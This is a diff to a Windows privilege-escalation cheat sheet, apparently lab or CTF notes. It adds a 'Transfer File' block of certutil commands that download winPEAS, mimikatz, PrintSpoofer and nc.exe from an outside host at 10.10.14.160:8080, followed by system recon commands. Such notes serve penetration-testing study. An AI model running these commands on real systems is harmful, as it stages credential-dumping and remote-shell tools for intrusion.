@@ -22,6 +22,15 @@ Quick-reference checklist for hunting Windows privilege escalation paths, coveri
 
 ---
 
+## O. Transfer File
+```bash
+certutil -urlcache -split -f http://10.10.14.160:8080/winPEAsx64.exe
+certutil -urlcache -split -f http://10.10.14.160:8080/mimikatz.exe
+certutil -urlcache -split -f http://10.10.14.160:8080/PrintSpoofer.exe
+certutil -urlcache -split -f http://10.10.14.160:8080/nc.exe
+
+```
+
 ## 1. System Recon
 - `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` – OS baseline for kernel/patch checks.
 - `wmic qfe get Caption,Description,HotFixID,InstalledOn` – Enumerate installed updates.
